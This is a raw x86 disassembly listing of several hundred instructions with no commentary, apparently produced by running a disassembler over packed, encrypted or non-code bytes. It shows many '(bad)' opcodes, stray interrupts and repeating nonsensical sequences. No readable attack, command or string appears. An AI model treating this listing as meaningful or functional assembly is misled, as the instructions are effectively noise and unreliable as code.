  425abb:	std    
  425abc:	cmp    edi,DWORD PTR [ecx-0x2d]
  425abf:	mov    ebp,0xfff40492
  425ac4:	shl    ebp,cl
  425ac6:	sub    BYTE PTR [ebx-0x3b],dl
  425ac9:	xchg   ecx,esi
  425acb:	int    0x76
  425acd:	adc    al,0xa
  425acf:	int3   
  425ad0:	pop    ss
  425ad1:	aam    0x0
  425ad3:	add    BYTE PTR [eax],al
  425ad5:	int    0x8d
  425ad7:	adc    al,0x4
  425ad9:	add    bh,bh
  425adb:	shl    edx,cl
  425add:	sub    BYTE PTR [ebx],bh
  425adf:	jns    0x425ab4
  425ae1:	mov    ebp,0xcdd35392
  425ae6:	(bad)  
  425ae7:	std    
  425ae8:	int    0x96
  425aea:	std    
  425aeb:	add    al,0xfb
  425aed:	(bad)  
  425aee:	cmp    ecx,DWORD PTR [edi]
  425af0:	shr    edx,cl
  425af2:	sub    bl,dl
  425af4:	jmp    0x425a88
  425af6:	push   ebx
  425af7:	adc    ecx,ebp
  425af9:	xchg   esi,eax
  425afa:	std    
  425afb:	int    0xa6
  425afd:	std    
  425afe:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b04:	repz xchg edx,eax
  425b06:	shl    ebp,cl
  425b08:	sub    BYTE PTR [ebx-0x2b],dl
  425b0b:	xchg   DWORD PTR [ebx],edx
  425b0d:	int    0x96
  425b0f:	std    
  425b10:	int    0xa6
  425b12:	std    
  425b13:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b19:	in     eax,0x28
  425b1b:	shl    ebx,cl
  425b1d:	xchg   edx,eax
  425b1e:	push   ebx
  425b1f:	aad    0x87
  425b21:	adc    ecx,DWORD PTR [edx]
  425b23:	add    eax,0xd4cf
  425b28:	add    bh,cl
  425b2a:	push   es
  425b2b:	nop
  425b2c:	add    BYTE PTR [eax],al
  425b2e:	add    BYTE PTR [eax-0x33],dh
  425b31:	jbe    0x425b30
  425b33:	int    0x8d
  425b35:	std    
  425b36:	sar    bh,0x63
  425b39:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b3c:	or     al,0xd3
  425b3e:	mov    ebp,0x28f2d392
  425b43:	push   ebx
  425b44:	shl    DWORD PTR [eax-0x33],cl
  425b47:	jbe    0x425b75
  425b49:	iret   
  425b4a:	or     DWORD PTR [ecx-0x80],eax
  425b4d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425b54:	add    BYTE PTR [eax-0x69ffb000],0x24
  425b5b:	int    0x8d
  425b5d:	push   esp
  425b5e:	or     al,BYTE PTR [ecx-0x32528933]
  425b64:	lea    esi,[ebp-0x6d82bad1]
  425b6a:	shr    ebx,cl
  425b6c:	xchg   edx,eax
  425b6d:	int    0x8d
  425b6f:	lods   eax,DWORD PTR ds:[esi]
  425b70:	int    0x96
  425b72:	mov    ch,0x3b
  425b74:	leave  
  425b75:	cmp    ebx,edx
  425b77:	push   ebx
  425b78:	icebp  
  425b79:	bound  eax,QWORD PTR [eax]
  425b7b:	(bad)  
  425b7c:	xor    al,0xd3
  425b7e:	repnz sub BYTE PTR [eax],al
  425b81:	(bad)  
  425b82:	inc    esp
  425b83:	mov    ebp,0xfb94
  425b88:	int    0x76
  425b8a:	lods   eax,DWORD PTR ds:[esi]
  425b8b:	int    0x8d
  425b8d:	mov    ch,0x2f
  425b8f:	inc    ebp
  425b90:	jge    0x425b24
  425b92:	shr    ebx,cl
  425b94:	xchg   edx,eax
  425b95:	int    0x8d
  425b97:	lods   eax,DWORD PTR ds:[esi]
  425b98:	int    0x96
  425b9a:	mov    ch,0x3b
  425b9c:	leave  
  425b9d:	cmp    ebx,edx
  425b9f:	push   ebx
  425ba0:	icebp  
  425ba1:	bound  eax,QWORD PTR [eax]
  425ba3:	(bad)  
  425ba4:	push   esp
  425ba5:	shl    edx,cl
  425ba7:	sub    BYTE PTR [eax],al
  425ba9:	(bad)  
  425baa:	cmp    al,0xbd
  425bac:	inc    esp
  425bad:	sti    
  425bae:	add    BYTE PTR [eax],al
  425bb0:	int    0x76
  425bb2:	std    
  425bb3:	int    0x8d
  425bb5:	std    
  425bb6:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425bb9:	repnz sub BYTE PTR [ebx],bh
  425bbc:	jns    0x425b91
  425bbe:	mov    ebp,0xcdd35392
  425bc3:	(bad)  
  425bc4:	std    
  425bc5:	int    0x96
  425bc7:	std    
  425bc8:	cmp    ecx,DWORD PTR [edi]
  425bca:	shr    ebx,cl
  425bcc:	xchg   edx,eax
  425bcd:	cmp    edx,ebp
  425bcf:	shr    edx,cl
  425bd1:	sub    BYTE PTR [ebx+0x13],dl
  425bd4:	xchg   ebx,edx
  425bd6:	int    0x8d
  425bd8:	std    
  425bd9:	int    0x96
  425bdb:	std    
  425bdc:	cmp    ecx,DWORD PTR [edi]
  425bde:	shr    ebx,cl
  425be0:	xchg   edx,eax
  425be1:	cmp    edx,ebp
  425be3:	shr    edx,cl
  425be5:	sub    BYTE PTR [ebx+0x13],dl
  425be8:	xchg   ebx,edx
  425bea:	int    0x8d
  425bec:	std    
  425bed:	int    0x96
  425bef:	std    
  425bf0:	cmp    ecx,DWORD PTR [edi]
  425bf2:	shr    ebx,cl
  425bf4:	xchg   edx,eax
  425bf5:	cmp    edx,ebp
  425bf7:	shr    edx,cl
  425bf9:	sub    BYTE PTR [ebx+0x13],dl
  425bfc:	xchg   ebx,edx
  425bfe:	or     al,BYTE PTR [esi]
  425c00:	nop
  425c01:	add    BYTE PTR [eax],al
  425c03:	add    ch,cl
  425c05:	jbe    0x425c5b
  425c07:	int    0x80
  425c09:	int    0x8d
  425c0b:	mov    ebp,0x3bbd96cd
  425c10:	(bad)  
  425c12:	aad    0xd3
  425c14:	jmp    0x425ba8
  425c16:	shr    edx,cl
  425c18:	sub    BYTE PTR [ebx+0x13],dl
  425c1b:	or     al,BYTE PTR ds:0xd4cf
  425c21:	add    ch,cl
  425c23:	jbe    0x425c71
  425c25:	int    0x80
  425c27:	int    0x8d
  425c29:	std    
  425c2a:	int    0x96
  425c2c:	std    
  425c2d:	cmp    ecx,DWORD PTR [edi]
  425c2f:	shr    ebx,cl
  425c31:	xchg   edx,eax
  425c32:	int    0x6c
  425c34:	jo     0x425c71
  425c36:	aad    0xd3
  425c38:	jmp    0xcf05:0xa135328
  425c3f:	aam    0x0
  425c41:	add    BYTE PTR [eax],al
  425c43:	int    0x76
  425c45:	sbb    al,0xcd
  425c47:	lea    ebx,[ebx+edi*1]
  425c4a:	or     al,0xd3
  425c4c:	repnz sub BYTE PTR [ebx],bh
  425c4f:	jns    0x425c24
  425c51:	mov    ebp,0xcdd35392
  425c56:	(bad)  
  425c57:	std    
  425c58:	int    0x96
  425c5a:	std    
  425c5b:	cmp    edx,ebp
  425c5d:	cmp    ecx,DWORD PTR [edi]
  425c5f:	shr    edx,cl
  425c61:	sub    bl,dl
  425c63:	jmp    0x425bf7
  425c65:	push   ebx
  425c66:	adc    ecx,ebp
  425c68:	xchg   esi,eax
  425c69:	std    
  425c6a:	int    0xa6
  425c6c:	std    
  425c6d:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425c73:	hlt    
  425c74:	call   ebx
  425c76:	in     eax,0x28
  425c78:	push   ebx
  425c79:	aad    0x87
  425c7b:	adc    ecx,DWORD PTR [edx]
  425c7d:	add    eax,0xd4cf
  425c82:	add    ch,cl
  425c84:	jbe    0x425c83
  425c86:	int    0x8d
  425c88:	std    
  425c89:	add    al,0x2
  425c8b:	call   ebx
  425c8d:	repnz sub BYTE PTR [ebx],bh
  425c90:	jns    0x425c65
  425c92:	mov    ebp,0xcdd35392
  425c97:	(bad)  
  425c98:	std    
  425c99:	int    0x96
  425c9b:	std    
  425c9c:	add    al,0xfb
  425c9e:	(bad)  
  425c9f:	cmp    ecx,DWORD PTR [edi]
  425ca1:	shr    edx,cl
  425ca3:	sub    bl,dl
  425ca5:	jmp    0x425c39
  425ca7:	push   ebx
  425ca8:	adc    eax,DWORD PTR [edi-0x272322d]
  425cae:	int    0x96
  425cb0:	std    
  425cb1:	add    al,0xfb
  425cb3:	(bad)  
  425cb4:	cmp    ecx,DWORD PTR [edi]
  425cb6:	shr    edx,cl
  425cb8:	sub    bl,dl
  425cba:	jmp    0x425c4e
  425cbc:	push   ebx
  425cbd:	adc    ecx,edi
  425cbf:	pop    ss
  425cc0:	nop
  425cc1:	add    BYTE PTR [eax],al
  425cc3:	add    BYTE PTR [edx-0x33],ah
  425cc6:	xchg   esi,eax
  425cc7:	std    
  425cc8:	int    0xa6
  425cca:	std    
  425ccb:	xchg   ebx,edx
  425ccd:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425cd3:	int3   
  425cd4:	push   es
  425cd5:	aam    0x0
  425cd7:	add    BYTE PTR [eax],al
  425cd9:	int    0x76
  425cdb:	sub    al,0x4
  425cdd:	hlt    
  425cde:	call   ebx
  425ce0:	repz xchg edx,eax
  425ce2:	shl    ebp,cl
  425ce4:	sub    BYTE PTR [ebx-0x2b],dl
  425ce7:	iret   
  425ce8:	or     edi,ebp
  425cea:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425cf1:	add    BYTE PTR [eax+0x50007162],0x0
  425cf8:	xchg   esi,eax
  425cf9:	and    al,0x6
  425cfb:	ins    DWORD PTR es:[edi],dx
  425cfc:	aam    0xbc
  425cfe:	int    0x76
  425d00:	in     eax,dx
  425d01:	int    0x8d
  425d03:	adc    DWORD PTR [edi],ebp
  425d05:	inc    ebp
  425d06:	jge    0x425c9a
  425d08:	shr    ebx,cl
  425d0a:	xchg   edx,eax
  425d0b:	int    0xe3
  425d0d:	int    0x7d
  425d0f:	int    0x76
  425d11:	in     eax,dx
  425d12:	int    0x96
  425d14:	adc    DWORD PTR [ebx],edi
  425d16:	fidivr DWORD PTR [ebx]
  425d18:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425d1f:	push   ebx
  425d20:	adc    ecx,ebp
  425d22:	xor    BYTE PTR [ebx-0x76],al
  425d25:	jo     0x425cf4
  425d27:	xchg   esi,eax
  425d28:	push   esp
  425d29:	in     al,dx
  425d2a:	push   esp
  425d2b:	int    0x92
  425d2d:	int    0xa6
  425d2f:	push   eax
  425d30:	retf   0x5324
  425d33:	or     DWORD PTR [eax+ecx*4],esp
  425d36:	int    0x76
  425d38:	cmc    
  425d39:	int    0x8d
  425d3b:	stc    
  425d3c:	das    
  425d3d:	inc    ebp
  425d3e:	jge    0x425cd2
  425d40:	shr    ebx,cl
  425d42:	xchg   edx,eax
  425d43:	int    0x8d
  425d45:	cmc    
  425d46:	int    0xa6
  425d48:	stc    
  425d49:	cmp    ecx,ecx
  425d4b:	cmp    ebx,ebp
  425d4d:	shl    edx,cl
  425d4f:	sub    ch,cl
  425d51:	lea    esi,[eax]
  425d53:	push   ebx
  425d54:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425d5a:	int    0x1c
  425d5c:	inc    ebx
  425d5d:	(bad)  
  425d5e:	jo     0x425d6a
  425d60:	lea    esi,[eax]
  425d62:	or     cl,0xec
  425d65:	xchg   ch,cl
  425d67:	xchg   esi,eax
  425d68:	push   esp
  425d69:	int    0x76
  425d6b:	dec    esp
  425d6c:	int    0x4a
  425d6e:	int    0x20
  425d70:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425d76:	sbb    al,0xcd
  425d78:	dec    edx
  425d79:	xchg   ebp,ecx
  425d7b:	sub    eax,0xa808080
  425d80:	lea    esi,[eax]
  425d82:	int    0x4a
  425d84:	int    0xa6
  425d86:	push   eax
  425d87:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425d8e:	int    0x80
  425d90:	int    0x4a
  425d92:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425d96:	jbe    0x425d85
  425d98:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425d9e:	das    
  425d9f:	inc    ebp
  425da0:	jge    0x425d34
  425da2:	shr    ebx,cl
  425da4:	xchg   edx,eax
  425da5:	int    0x8d
  425da7:	in     eax,dx
  425da8:	int    0xa6
  425daa:	adc    DWORD PTR [ebx],edi
  425dac:	leave  
  425dad:	cmp    ebx,ebp
  425daf:	shl    edx,cl
  425db1:	sub    BYTE PTR [ebx-0x3b],dl
  425db4:	or     dh,BYTE PTR [esi+0x44]
  425db7:	int    0x76
  425db9:	xor    bl,ch
  425dbb:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425dc1:	in     eax,dx
  425dc2:	int    0x8d
  425dc4:	adc    DWORD PTR [edi],ebp
  425dc6:	inc    ebp
  425dc7:	jge    0x425d5b
  425dc9:	shr    ebx,cl
  425dcb:	xchg   edx,eax
  425dcc:	int    0x8d
  425dce:	in     eax,dx
  425dcf:	int    0xa6
  425dd1:	adc    ebx,edx
  425dd3:	repnz sub ch,cl
  425dd6:	lea    edx,[ebx+edi*1]
  425dd9:	leave  
  425dda:	cmp    ebx,ebp
  425ddc:	add    al,0xd3
  425dde:	stc    
  425ddf:	push   ebx
  425de0:	(bad)
  425de3:	inc    ebx
  425de4:	shr    DWORD PTR [edi],cl
  425de6:	add    al,0xf7
  425de8:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425df0:	dec    ebx
  425df1:	mov    BYTE PTR [ebx],dh
  425df3:	jge    0x425dff
  425df5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425df6:	xor    al,0xa
  425df8:	lea    edi,[ecx*8+0x76cdf18d]
  425dff:	xchg   ebp,eax
  425e00:	das    
  425e01:	inc    ebp
  425e02:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e08:	jbe    0x425dfb
  425e0a:	int    0xa6
  425e0c:	xchg   ebp,eax
  425e0d:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e13:	cmp    esi,eax
  425e15:	cmp    ebx,ebp
  425e17:	push   ebx
  425e18:	or     al,0xcd
  425e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e1b:	stc    
  425e1c:	das    
  425e1d:	inc    ebp
  425e1e:	popf   
  425e1f:	xchg   edx,eax
  425e20:	or     dh,BYTE PTR [esi+0x54]
  425e23:	int    0x76
  425e25:	cmc    
  425e26:	push   ecx
  425e27:	out    0x54,al
  425e29:	add    al,0xd3
  425e2b:	dec    edx
  425e2c:	shr    esp,cl
  425e2e:	xchg   edx,eax
  425e2f:	int    0xa6
  425e31:	stc    
  425e32:	cmp    ebx,ebp
  425e34:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e3a:	int    0xa6
  425e3c:	cmc    
  425e3d:	int    0x8d
  425e3f:	stc    
  425e40:	das    
  425e41:	inc    ebp
  425e42:	or     al,0x92
  425e44:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e4a:	shr    ebx,cl
  425e4c:	xchg   edx,eax
  425e4d:	int    0x8d
  425e4f:	stc    
  425e50:	cmp    ecx,ebx
  425e52:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425e58:	cmp    esp,ecx
  425e5a:	push   ebx
  425e5b:	fcmovne st,st(5)
  425e5d:	lea    esi,[edi+ebp*1]
  425e60:	mov    ebx,0x2bc53389
  425e65:	ror    ebp,cl
  425e67:	(bad)  
  425e68:	icebp  
  425e69:	or     dh,BYTE PTR [esi+0x54]
  425e6c:	int    0x76
  425e6e:	xchg   ebp,eax
  425e6f:	das    
  425e70:	inc    ebp
  425e71:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e77:	jbe    0x425e6a
  425e79:	int    0xa6
  425e7b:	xchg   ebp,eax
  425e7c:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425e82:	das    
  425e83:	mov    ebx,0xa6020180
  425e88:	cmp    ebx,ebp
  425e8a:	dec    edx
  425e8b:	or     al,0x1
  425e8d:	ror    DWORD PTR [edx-0x2b],cl
  425e90:	mov    ebp,0xbdbfcb3b
  425e95:	or     ah,BYTE PTR [ebx]
  425e97:	and    eax,0x92d3352f
  425e9c:	shr    DWORD PTR [ebp+0x37d65692],cl
  425ea2:	ficom  WORD PTR [ebx]
  425ea4:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425ea7:	fidiv  WORD PTR [edi]
  425ea9:	ficom  WORD PTR [ebx]
  425eab:	(bad)  
  425eac:	ss inc ebx
  425eae:	or     al,0xd6
  425eb0:	cs int 0x92
  425eb3:	int    0x8d
  425eb5:	xor    BYTE PTR [edi+0x548dcd81],al
  425ebb:	add    al,0x64
  425ebd:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425ec3:	int    0x8d
  425ec5:	xor    BYTE PTR [edi-0x7772327f],al
  425ecb:	xchg   DWORD PTR [esi+0x54],esi
  425ece:	int    0x89
  425ed0:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425eda:	push   es
  425edb:	and    eax,DWORD PTR [eax]
  425edd:	add    BYTE PTR [eax],al
  425edf:	in     al,dx
  425ee0:	test   DWORD PTR [edi+0x25230abd],edi
  425ee6:	int    0x76
  425ee8:	adc    al,0x81
  425eea:	jbe    0x425f30
  425eec:	leave  
  425eed:	jbe    0x425f5c
  425eef:	scas   al,BYTE PTR es:[edi]
  425ef0:	aaa    
  425ef1:	ficom  WORD PTR [ebx]
  425ef3:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425ef9:	int    0x8d
  425efb:	jne    0x425f2c
  425efd:	inc    ebp
  425efe:	jge    0x425e92
  425f00:	shr    ebx,cl
  425f02:	xchg   edx,eax
  425f03:	int    0x8d
  425f05:	ins    DWORD PTR es:[edi],dx
  425f06:	int    0xa6
  425f08:	jne    0x425edd
  425f0a:	repnz sub ch,cl
  425f0d:	lea    ecx,[ebp+ecx*8-0x77]
  425f11:	cmp    ecx,ecx
  425f13:	cmp    ebx,ebp
  425f15:	push   ebx
  425f16:	(bad)
  425f19:	shl    esp,cl
  425f1b:	int    0x8d
  425f1d:	inc    esp
  425f1e:	inc    ebx
  425f1f:	mov    BYTE PTR [edi+0x54],dh
  425f22:	int    0x76
  425f24:	xor    BYTE PTR [edi+0x760a1476],al
  425f2a:	xor    ch,cl
  425f2c:	ins    BYTE PTR es:[edi],dx
  425f2d:	test   BYTE PTR [edx],cl
  425f2f:	jbe    0x425f45
  425f31:	int    0x76
  425f33:	in     eax,dx
  425f34:	int    0x8d
  425f36:	adc    DWORD PTR [edi],ebp
  425f38:	inc    ebp
  425f39:	jge    0x425ecd
  425f3b:	shr    ebx,cl
  425f3d:	xchg   edx,eax
  425f3e:	int    0x8d
  425f40:	in     eax,dx
  425f41:	int    0xa6
  425f43:	adc    DWORD PTR [ebx],edi
  425f45:	fnstsw WORD PTR [ebx]
  425f47:	leave  
  425f48:	push   ebx
  425f49:	(bad)
  425f4c:	sub    BYTE PTR [esi+0x76],bl
  425f4f:	adc    al,0x2f
  425f51:	push   es
  425f52:	mov    esi,0xcd0000ff
  425f57:	(bad)  
  425f58:	std    
  425f59:	int    0x96
  425f5b:	std    
  425f5c:	cmp    ecx,DWORD PTR [edi]
  425f5e:	shr    ebx,cl
  425f60:	xchg   edx,eax
  425f61:	sar    bh,0x9c
  425f64:	cmp    esi,ecx
  425f66:	shr    edx,cl
  425f68:	sub    BYTE PTR [ebx+0x13],dl
  425f6b:	int    0x96
  425f6d:	std    
  425f6e:	int    0xa6
  425f70:	std    
  425f71:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f77:	popf   
  425f78:	shl    ebp,cl
  425f7a:	sub    BYTE PTR [ebx-0x2b],dl
  425f7d:	xchg   DWORD PTR [ebx],edx
  425f7f:	int    0x96
  425f81:	std    
  425f82:	int    0xa6
  425f84:	std    
  425f85:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f8b:	popf   
  425f8c:	shl    ebp,cl
  425f8e:	sub    BYTE PTR [ebx-0x2b],dl
  425f91:	xchg   DWORD PTR [ebx],edx
  425f93:	int    0x96
  425f95:	std    
  425f96:	int    0xa6
  425f98:	std    
  425f99:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425f9f:	xchg   edx,eax
  425fa0:	shl    ebp,cl
  425fa2:	sub    BYTE PTR [ebx-0x2b],dl
  425fa5:	xchg   DWORD PTR [ebx],edx
  425fa7:	or     cl,bh
  425fa9:	nop
  425faa:	add    BYTE PTR [eax],al
  425fac:	add    ch,cl
  425fae:	lea    edx,[eax-0x33]
  425fb1:	xchg   esi,eax
  425fb2:	mov    ebp,0x3bbda6cd
  425fb7:	cdq    
  425fb8:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fbe:	in     eax,0x28
  425fc0:	push   ebx
  425fc1:	aad    0xa
  425fc3:	int3   
  425fc4:	pop    ss
  425fc5:	aam    0x0
  425fc7:	add    BYTE PTR [eax],al
  425fc9:	int    0x8d
  425fcb:	dec    esp
  425fcc:	int    0x89
  425fce:	int    0x96
  425fd0:	std    
  425fd1:	int    0xa6
  425fd3:	std    
  425fd4:	int    0x7e
  425fd6:	jo     0x426013
  425fd8:	cdq    
  425fd9:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fdf:	in     eax,0x28
  425fe1:	push   ebx
  425fe2:	aad    0xa
  425fe4:	int3   
  425fe5:	pop    ss
  425fe6:	aam    0x0
  425fe8:	add    BYTE PTR [eax],al
  425fea:	int    0x8d
  425fec:	sbb    al,0xcd
  425fee:	xchg   esi,eax
  425fef:	sbb    al,0x3b
  425ff1:	icebp  
  425ff2:	shr    edx,cl
  425ff4:	sub    BYTE PTR [ebx],bh
  425ff6:	psrlq  mm5,mm3
  425ff9:	xchg   edx,eax
  425ffa:	push   ebx
  425ffb:	adc    ecx,ebp
  425ffd:	xchg   esi,eax
  425ffe:	std    
  425fff:	int    0xa6
  426001:	std    
  426002:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  426008:	cdq    
  426009:	shl    ebp,cl
  42600b:	sub    bl,dl
  42600d:	repz xchg edx,eax
  42600f:	push   ebx
  426010:	aad    0xcd
  426012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426013:	std    
  426014:	cmp    edi,DWORD PTR [ecx+0x4]
  426017:	hlt    
  426018:	call   ebx
  42601a:	mov    ebp,0x28e5d392
  42601f:	push   ebx
  426020:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  426026:	aam    0x0
  426028:	add    BYTE PTR [eax],al
  42602a:	int    0x8d
  42602c:	std    
  42602d:	int    0x96
  42602f:	std    
  426030:	cmp    ecx,DWORD PTR [edi]
  426032:	shr    ebx,cl
  426034:	xchg   edx,eax
  426035:	sar    bh,0x9c
  426038:	cmp    esi,ecx
  42603a:	shr    edx,cl
  42603c:	sub    BYTE PTR [ebx+0x13],dl
  42603f:	int    0x96
  426041:	std    
  426042:	int    0xa6
  426044:	std    
  426045:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42604b:	popf   
  42604c:	shl    ebp,cl
  42604e:	sub    BYTE PTR [ebx-0x2b],dl
  426051:	xchg   DWORD PTR [ebx],edx
  426053:	int    0x96
  426055:	std    
  426056:	int    0xa6
  426058:	std    
  426059:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42605f:	popf   
  426060:	shl    ebp,cl
  426062:	sub    BYTE PTR [ebx-0x2b],dl
  426065:	xchg   DWORD PTR [ebx],edx
  426067:	iret   
  426068:	xchg   esi,eax
  426069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42606a:	or     dl,BYTE PTR ds:0xd4cf
  426070:	add    bh,cl
  426072:	iret   
  426073:	nop
  426074:	add    BYTE PTR [eax],al
  426076:	add    BYTE PTR [ecx-0x33],dh
  426079:	(bad)  
  42607a:	std    
  42607b:	int    0x96
  42607d:	std    
  42607e:	cmp    ecx,DWORD PTR [edi]
  426080:	int    0xd6
  426082:	sub    al,0x3b
  426084:	icebp  
  426085:	shr    ebx,cl
  426087:	xchg   edx,eax
  426088:	shr    edx,cl
  42608a:	sub    BYTE PTR [ebx+0x13],dl
  42608d:	jno    0x42605e
  42608f:	pop    es
  426090:	out    dx,eax
  426091:	add    BYTE PTR [eax+0x7cd7080],0x3d
  426098:	add    DWORD PTR [eax+0x500080],0x7cd2496
  4260a2:	add    DWORD PTR [ecx+0x760a8080],eax
  4260a8:	dec    esp
  4260a9:	int    0x76
  4260ab:	mov    ch,cl
  4260ad:	mov    BYTE PTR [edi-0x72f5b373],al
  4260b3:	dec    esp
  4260b4:	int    0x8d
  4260b6:	cmc    
  4260b7:	int    0x96
  4260b9:	stc    
  4260ba:	das    
  4260bb:	inc    ebp
  4260bc:	jecxz  0x426050
  4260be:	shl    ebx,cl
  4260c0:	xchg   edx,eax
  4260c1:	int    0x96
  4260c3:	cmc    
  4260c4:	int    0xd6
  4260c6:	stc    
  4260c7:	cmp    esi,edi
  4260c9:	shr    edx,cl
  4260cb:	sub    ch,cl
  4260cd:	xchg   esi,eax
  4260ce:	cmc    
  4260cf:	cmp    esi,eax
  4260d1:	push   ebx
  4260d2:	bswap  ebp
  4260d4:	(bad)  
  4260d5:	stc    
  4260d6:	das    
  4260d7:	inc    ebp
  4260d8:	sti    
  4260d9:	xchg   edx,eax
  4260da:	shr    edi,cl
  4260dc:	xchg   edx,eax
  4260dd:	int    0xd6
  4260df:	cmc    
  4260e0:	int    0xa6
  4260e2:	stc    
  4260e3:	cmp    ebx,ecx
  4260e5:	cmp    ebx,ebp
  4260e7:	push   ebx
  4260e8:	aad    0x87
  4260ea:	adc    ecx,ebp
  4260ec:	xchg   esi,eax
  4260ed:	cmc    
  4260ee:	sar    DWORD PTR [ecx-0x62932d8],cl
  4260f4:	das    
  4260f5:	inc    ebp
  4260f6:	sti    
  4260f7:	xchg   edx,eax
  4260f8:	shr    edi,cl
  4260fa:	xchg   edx,eax
  4260fb:	int    0xd6
  4260fd:	cmc    
  4260fe:	int    0xa6
  426100:	stc    
  426101:	cmp    ebx,ecx
  426103:	cmp    ebx,ebp
  426105:	push   ebx
  426106:	aad    0x87
  426108:	adc    ecx,ebp
  42610a:	xchg   esi,eax
  42610b:	cmc    
  42610c:	sar    DWORD PTR [ecx-0x62932d8],cl
  426112:	das    
  426113:	inc    ebp
  426114:	sti    
  426115:	xchg   edx,eax
  426116:	shr    edi,cl
  426118:	xchg   edx,eax
  426119:	int    0xd6
  42611b:	cmc    
  42611c:	cmp    ebx,ecx
  42611e:	int    0xe6
  426120:	stc    
  426121:	cmp    eax,DWORD PTR [eax]
  426123:	push   ebx
  426124:	fld    DWORD PTR [edi+0x707113]
  42612a:	(bad)  
  42612b:	dec    esp
  42612c:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426132:	add    BYTE PTR [eax],al
  426134:	int    0x76
  426136:	or     eax,0xcb63a8aa
  42613b:	rcl    BYTE PTR [eax-0x80],cl
  42613e:	xchg   esi,eax
  42613f:	int    0xed
  426141:	add    al,0xed
  426143:	inc    esp
  426144:	pop    ebx
  426145:	cwde   
  426146:	call   0x76c9:0xcb3bdd3b
  42614d:	popf   
  42614e:	(bad)  
  42614f:	aaa    
  426150:	ficom  WORD PTR [ebx]
  426152:	pop    ebp
  426153:	mov    ebp,0xa25230a
  426158:	jbe    0x4260ff
  42615a:	leave  
  42615b:	jbe    0x42611a
  42615d:	xchg   ecx,eax
  42615e:	aaa    
  42615f:	ficom  WORD PTR [ebx]
  426161:	or     dh,BYTE PTR [esi-0x13]
  426164:	leave  
  426165:	jbe    0x426154
  426167:	dec    ecx
  426168:	mov    al,ds:0x76c93586
  42616d:	cmc    
  42616e:	dec    ecx
  42616f:	lahf   
  426170:	xchg   BYTE PTR ds:0x691176c9,dh
  426176:	and    DWORD PTR [esi+0x1176c935],eax
  42617c:	cmp    DWORD PTR [ecx],esp
  42617e:	xchg   BYTE PTR ds:0x49f976c9,dh
  426184:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  42618b:	jbe    0x426186
  42618d:	int    0x76
  42618f:	sbb    al,0xcd
  426191:	shl    BYTE PTR ds:0xcd808081,1
  426197:	jbe    0x4261b5
  426199:	int    0x8d
  42619b:	sbb    al,0xcd
  42619d:	add    DWORD PTR ds:0xcd808081,ebp
  4261a3:	xor    ch,cl
  4261a5:	pop    esp
  4261a6:	xchg   eax,esp
  4261a8:	fs int 0x96
  4261ab:	popf   
  4261ac:	int    0xa
  4261ae:	and    eax,0xa808081
  4261b3:	out    0xb5,al
  4261b5:	int    0xe6
  4261b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261b8:	das    
  4261b9:	inc    ebp
  4261ba:	add    edx,DWORD PTR [edx-0x326def2d]
  4261c0:	out    0x9d,al
  4261c2:	int    0xa6
  4261c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261c5:	adc    bh,bl
  4261c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261c8:	mov    esi,0xdd3b4229
  4261cd:	shr    ecx,cl
  4261cf:	sub    ch,cl
  4261d1:	pop    esi
  4261d2:	push   ebx
  4261d3:	aad    0x43
  4261d5:	(bad)  
  4261d7:	nop
  4261d8:	int    0x18
  4261da:	or     dl,BYTE PTR [esi+0x1496cdf9]
  4261e0:	int    0x96
  4261e2:	xor    ch,cl
  4261e4:	xchg   esi,eax
  4261e5:	dec    esp
  4261e6:	iret   
  4261e7:	xchg   esi,eax
  4261e8:	lods   eax,DWORD PTR ds:[esi]
  4261e9:	bound  eax,QWORD PTR [eax]
  4261eb:	(bad)  
  4261ec:	stc    
  4261ed:	jno    0x42625f
  4261ef:	cwde   
  4261f0:	add    dh,dl
  4261f2:	sbb    al,0xcf
  4261f4:	jbe    0x4261ab
  4261f6:	add    dh,dl
